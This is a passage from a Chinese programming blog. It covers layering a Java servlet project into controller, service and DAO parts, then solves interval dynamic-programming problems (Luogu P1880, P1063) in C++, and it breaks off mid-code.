class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>至于前端的页面长什么样,后端不用管,后端只关心控制层接收到的get参数叫什么,是叫"username",还是"UserName"还是"userCode".</p>
<p>前端需要知道一个get请求应该发往哪一个Servlet</p>
<p>只有这两个是前后端开发者需要协商的</p>
<p>4.建立字符过滤器,设置前后端都使用utf-8编码</p>
<h3 id="自顶向下还是自底向上">自顶向下还是自底向上</h3>
<p>目前感觉两种方法均可</p>
<p>两头都很具体,顶上是前端写好的请求,参数名都已知,交给哪一个Servlet也是确定的</p>
<p>底下有几个数据表,都长什么样也是确定的</p>
<p>中间的service层很多情况下只是对Dao层的一个薄封装,以service层的UserServiceImpl.login函数为例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> User <span class="title function_">login</span><span class="params">(String userCode, String password)</span> &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        connection = DruidDao.getConnection();</span><br><span class="line">        user = userDao.getLoginUser(connection, userCode);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">        throwables.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        DruidDao.closeResource(<span class="literal">null</span>, <span class="literal">null</span>, connection);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//进行密码匹配</span></span><br><span class="line">    <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!user.getUserPassword().equals(password)) &#123;</span><br><span class="line">            user = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上这么一长段的核心功能就是</p>
<p>接收一个userCode一个password,返回一个user
pojo.就是多加了一个密码判断</p>
<p>UserServiceImpl.updataPwd更明显,直接调用了Dao层,除此之外啥也没干</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">updatePwd</span><span class="params">(<span class="type">int</span> id, String pwd)</span> &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        connection = DruidDao.getConnection();</span><br><span class="line">        <span class="keyword">if</span> (userDao.updatePwd(connection, id, pwd) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">        throwables.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        DruidDao.closeResource(<span class="literal">null</span>, <span class="literal">null</span>, connection);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还是采用自顶向下吧,根据前端存在的需求,决定后端写哪些服务</p>
<p>比如对于用户表,不存在修改用户名的需求,因为有新建用户就够了.</p>
<p>如果自底向上写的话,不知道需要对用户表的哪些字段进行什么操作.</p>
<p>如果自顶向下写的话,首先知道的就是需求,然后根据需求决定下层要提供什么服务,然后再实现该服务,不需要的服务不写</p>
<h3 id="建立controller层">建立Controller层</h3>
<p>前端和后端商量好的,前端可能会产生哪些请求,每个请求发给哪个servlet</p>
<p>再细分一下,感觉</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这是前端写的</span><br><span class="line">	<span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login.do<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这是后端写的</span><br><span class="line">	<span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.threepure.servlet.user.LoginServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>现在就面临一个问题</p>
<p>用户的行为可能有很多,比如登录,注销,修改密码,订单管理,供应商管理等等</p>
<p>这么多行为,应该用几个servlet实现?</p>
<p>针对用户的行为,有三个Servlet,LoginServlet,LogoutServlet,UserServlet</p>
<p>为啥要这样划分?</p>
<p>首先考虑权限问题,前端是无法过滤请求的,权限控制只能是后端的权限过滤器来做</p>
<p>权限过滤器根据session是否设置决定能否请求资源,对任何<code>/jsp/*的</code>请求生效</p>
<p>用户的行为中,只有登录界面是在设置session前可以访问的,因此webapp下面的login.jsp不会被权限过滤,任何情况均可访问</p>
<p>因此登录行为自己建立一个LoginServlet</p>
<p>登录和注销,两个行为都会更改session状态,因此各自一个Servlet处理业务</p>
<p>其他的用户行为都需要登录权限,因此在jsp目录下,收到权限过滤器保护,这些行为都有session状态,都发往一个UserServlet</p>
<p>通过一个method参数,决定该UserServlet调用何种服务</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;method&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;savepwd&quot;</span>.equals(method) &amp;&amp; method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.updatePwd(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;pwdmodify&quot;</span>.equals(method) &amp;&amp; method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.pwdmodify(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;query&quot;</span>.equals(method) &amp;&amp; method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.userQuery(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;add&quot;</span>.equals(method) &amp;&amp; method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.add(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;getrolelist&quot;</span>.equals(method) &amp;&amp; method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.getRoleList(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;ucexist&quot;</span>.equals(method) &amp;&amp; method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.userCodeExist(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;view&quot;</span>.equals(method) &amp;&amp; method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.getUserById(req, resp, <span class="string">&quot;userview.jsp&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;modify&quot;</span>.equals(method) &amp;&amp; method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.getUserById(req, resp, <span class="string">&quot;usermodify.jsp&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;modifyexe&quot;</span>.equals(method) &amp;&amp; method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.userModify(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;deluser&quot;</span>.equals(method) &amp;&amp; method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.deleteUser(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上是控制耦合,这个method参数就是控制开关</p>
<p>Bill和Provider各自只有一个Servlet,也在doGet方法上采用控制耦合</p>
<p>总的来说,尽量少建立Servlet,可以使用控制耦合,大体上还是一个数据表对应一个Servlet,所有发生在该表上的行为,用一个Servlet处理,通过method参数的不同区分Service层的服务</p>
<h3 id="建立service层">建立Service层</h3>
<p>Controller层建立完毕之后,Service实际上已经固定了</p>
<p>User.getUserById给定一个用户名,查库建立一个user
pojo,从控制层到服务层到数据访问层逐层往下扔就是了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Controller层User.getUserById</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getUserById</span><span class="params">(HttpServletRequest req, HttpServletResponse resp, String url)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//获取传入的id</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uid</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;uid&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.isNullOrEmpty(uid)) &#123;</span><br><span class="line">            <span class="type">UserServiceImpl</span> <span class="variable">userService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserServiceImpl</span>();</span><br><span class="line">            <span class="type">User</span> <span class="variable">userById</span> <span class="operator">=</span> userService.getUserById(uid);<span class="comment">//往下扔</span></span><br><span class="line">            req.setAttribute(<span class="string">&quot;user&quot;</span>, userById);</span><br><span class="line">            req.getRequestDispatcher(url).forward(req, resp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="建立dao层">建立DAO层</h3>
<p><strong>每一个数据表都会对应一个pojo类,一个Dao层类</strong></p>
<p><strong>每一个数据表都会对应一个pojo类,一个Dao层类</strong></p>
<p><strong>每一个数据表都会对应一个pojo类,一个Dao层类</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Dao/</span><br><span class="line">	│  DaoBase.java</span><br><span class="line">	│</span><br><span class="line">	├─bill</span><br><span class="line">	│      BillDao.java</span><br><span class="line">	│      BillDaoImpl.java</span><br><span class="line">	│</span><br><span class="line">	├─provider</span><br><span class="line">	│      ProviderDao.java</span><br><span class="line">	│      ProviderDaoImpl.java</span><br><span class="line">	│</span><br><span class="line">	├─role</span><br><span class="line">	│      RoleDao.java</span><br><span class="line">	│      RoleDaoImpl.java</span><br><span class="line">	│</span><br><span class="line">	└─user</span><br><span class="line">	        UserDao.java</span><br><span class="line">	        UserDaoImpl.java</span><br></pre></td></tr></table></figure>
<p>比如用户表user,对应一个pojo
User,然后在Dao/user/下面有一个UserDao接口和一个UserDaoImpl实现</p>
<p>这个UserDao接口干了啥呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230104200556894.png"
alt="image-20230104200556894" />
<figcaption aria-hidden="true">image-20230104200556894</figcaption>
</figure>
<p><strong>每一个函数,都对应于一种user表中的原子操作(一条sql语句)</strong></p>
<p><strong>每一个函数,都对应于一种user表中的原子操作(一条sql语句)</strong></p>
<p><strong>每一个函数,都对应于一种user表中的原子操作(一条sql语句)</strong></p>
<table>
<colgroup>
<col style="width: 39%" />
<col style="width: 60%" />
</colgroup>
<thead>
<tr>
<th>UserDao函数</th>
<th>user表原子操作</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>getLoginUser( connection, userCode)</code></td>
<td><code>select * from smbms_user where userCode=?</code></td>
</tr>
<tr>
<td><code>updatePwd(connection,  id, password)</code></td>
<td><code>update smbms_user set userPassword = ? where id = ?</code></td>
</tr>
<tr>
<td><code>add(Connection connection, User user)</code></td>
<td><code>insert into smbms_user (userCode,userName,userPassword," +         "userRole,gender,birthday,phone,address,creationDate,createdBy) " +         "values(?,?,?,?,?,?,?,?,?,?)</code></td>
</tr>
<tr>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>"中途优化是万恶之源"</p>
<p>等整个网站正常运行起来之后,再考虑如何优化,到那时候再考虑使用什么Druid连接池</p>
<p>最初就用最普通的mysql就可以了</p>
<p>Service层:</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/23/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-%E5%8C%BA%E9%97%B4DP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/23/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-%E5%8C%BA%E9%97%B4DP/" class="post-title-link" itemprop="url">动态规划-区间DP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-12-23 21:30:00" itemprop="dateCreated datePublished" datetime="2022-12-23T21:30:00+08:00">2022-12-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-01-04 21:11:32" itemprop="dateModified" datetime="2023-01-04T21:11:32+08:00">2023-01-04</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="动态规划-区间dp">动态规划-区间DP</h1>
<p>模板题一般长这样:</p>
<p>给一个区间[1,n]</p>
<p>给定一种操作:合并子区间,两个相邻子区间[i,j],[j+1,k]合并,得到一定的收益或者付出一些代价.这个收益或者代价必然是和两个子区间相关的函数,比如sum[i,j]+sum[j+1,k]</p>
<p>求将整个区间合并为一个数,获得的最大收益或者付出的最小代价</p>
<h2 id="p1880-合并环状石子"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1880">P1880
合并环状石子</a></h2>
<p>一圈石子有n组,其中第i组有a[i]个,合并两组石子的代价是两组石子个数和,求将所有石子合并成一组需要的最大代价和最小代价</p>
<blockquote>
<p>本题需要先把环拆成线,其弱化版也就是无环版本<a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1775">P1775
石子合并（弱化版</a></p>
</blockquote>
<p>首先需要把这个圈解开,比较好的方法是将[1,n]展开成线性,然后复制一遍接到后面,就是</p>
<table style="width:100%;">
<colgroup>
<col style="width: 13%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 10%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 10%" />
<col style="width: 6%" />
</colgroup>
<thead>
<tr>
<th>总下标</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>...</th>
<th>n-1</th>
<th>n</th>
<th>n+1</th>
<th>n+2</th>
<th>n+3</th>
<th>...</th>
<th>2n-1</th>
<th>2n</th>
</tr>
</thead>
<tbody>
<tr>
<td>原下标</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>...</td>
<td>n-1</td>
<td>n</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>...</td>
<td>n-1</td>
<td>n</td>
</tr>
<tr>
<td>石子个数</td>
<td>a[1]</td>
<td>a[2]</td>
<td>a[3]</td>
<td>..</td>
<td>a[n-1]</td>
<td>a[n]</td>
<td>a[1]</td>
<td>a[2]</td>
<td>a[3]</td>
<td>...</td>
<td>a[n-1]</td>
<td>a[n]</td>
</tr>
</tbody>
</table>
<h3 id="设计状态">设计状态</h3>
<p><span class="math display">\[
max\_dp[i][j]=将[i,j]区间合并成一组的最大代价\\
min\_dp[i][j]=将[i,j]区间合并 成一组的最小代价
\]</span></p>
<p>显然边界条件是: <span class="math display">\[
\forall _{1\le i\le 2n}max\_dp[i][i]=0\\
\forall _{1\le i\le 2n}min\_dp[i][i]=0\\
\]</span>
意思是将一组石子和自己合并(合并个寂寞),其代价为0,因为不需要合并</p>
<p><span class="math display">\[
max\_dp[i][j]=\max_{i\leq
k&lt;j}(max\_dp[i][k]+max\_dp[k+1][j])+\sum_{i\leq l\leq j}a[l]\\
min\_dp[i][j]=\max_{i\leq
k&lt;j}(min\_dp[i][k]+min\_dp[k+1][j])+\sum_{i\leq l\leq j}a[l]
\]</span></p>
<p>其中<span class="math inline">\(\sum_{i\leq l\leq
j}a[l]\)</span>也就是从i到j的石子总个数,可以维护前缀和降低复杂度 <span
class="math display">\[
\sum_{i\leq l\leq j}a[l]=prefix[j]-prefix[i-1]
\]</span></p>
<h3 id="完整代码">完整代码</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF=<span class="number">1e9</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">210</span>;</span><br><span class="line"><span class="type">int</span> value[maxn];</span><br><span class="line"><span class="type">int</span> max_dp[maxn][maxn];<span class="comment">//max_dp[i][j]为合并闭区间[i,j]所需要的最大代价</span></span><br><span class="line"><span class="type">int</span> min_dp[maxn][maxn];</span><br><span class="line"><span class="type">int</span> prefix[maxn];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> v;</span><br><span class="line">    prefix[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;v;</span><br><span class="line">        value[i]=value[i+n]=v;</span><br><span class="line">        prefix[i]=prefix[i<span class="number">-1</span>]+value[i];</span><br><span class="line">        max_dp[i][i]=max_dp[i+n][i+n]=<span class="number">0</span>;<span class="comment">//初始化边界条件,只有一堆时不需要合并,因此无代价</span></span><br><span class="line">        min_dp[i][i]=min_dp[i+n][i+n]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>+n;i&lt;=n*<span class="number">2</span>;i++)&#123;</span><br><span class="line">        prefix[i]=prefix[i<span class="number">-1</span>]+value[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> delta=<span class="number">1</span>;delta&lt;n;delta++)&#123;<span class="comment">//delta,步长,确定区间左端点i之后,右端点j=i+delta,显然delta初始值应该是1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i=<span class="number">1</span>;i+delta&lt;=<span class="number">2</span>*n;i++)&#123;</span><br><span class="line">            <span class="keyword">auto</span> j=i+delta;</span><br><span class="line">            <span class="keyword">auto</span> temp_max=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">auto</span> temp_min=INF;<span class="comment">//临时变量,用于计算最值</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> k=i;k&lt;j;++k)&#123;</span><br><span class="line">                temp_max=<span class="built_in">max</span>(temp_max,max_dp[i][k]+max_dp[k<span class="number">+1</span>][j]+prefix[j]-prefix[i<span class="number">-1</span>]);<span class="comment">//状态转移</span></span><br><span class="line">                temp_min=<span class="built_in">min</span>(temp_min,min_dp[i][k]+min_dp[k<span class="number">+1</span>][j]+prefix[j]-prefix[i<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            max_dp[i][j]=temp_max;</span><br><span class="line">            min_dp[i][j]=temp_min;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> max_value=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> min_value=<span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        max_value=<span class="built_in">max</span>(max_value,max_dp[i][i+n<span class="number">-1</span>]);</span><br><span class="line">        min_value=<span class="built_in">min</span>(min_value,min_dp[i][i+n<span class="number">-1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;min_value&lt;&lt;endl&lt;&lt;max_value&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p1063-合并能量珠子"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1063">P1063
合并能量珠子</a></h2>
<p>每个珠子有两头,记作(l,r),相邻两个珠子的相向两头数值相同,比如 <span
class="math display">\[
(a,b)(b,c)(c,d)(d,a)
\]</span> 合并两个相邻珠子<span
class="math inline">\((a,b)(b,c)\)</span>得到的能量是<span
class="math inline">\(a\times b\times c\)</span>,合并之后形成新珠子<span
class="math inline">\((a,c)\)</span></p>
<p>将整个项链合并,求得到的最大能量值</p>
<p>还是将整个环拆成[1,n]然后拷贝一份接到后面</p>
<p><span
class="math inline">\(dp[i][j]\)</span>表示合并区间[i,j]能够得到的最大能量,其中i表示第i个珠子,j表示第j个珠子</p>
<p>边界条件仍然是<span
class="math inline">\(dp[i][i]=0\)</span>,只有一个珠子不需要合并</p>
<p>状态转移: <span class="math display">\[
dp[i][j]=\max_{i\le k&lt; j}(dp[i][k]+dp[k+1][j]+node[k].l\times
node[k].r\times node[k+1].r)
\]</span></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">210</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Bead</span>&#123;</span><br><span class="line">    <span class="type">int</span> __energy;<span 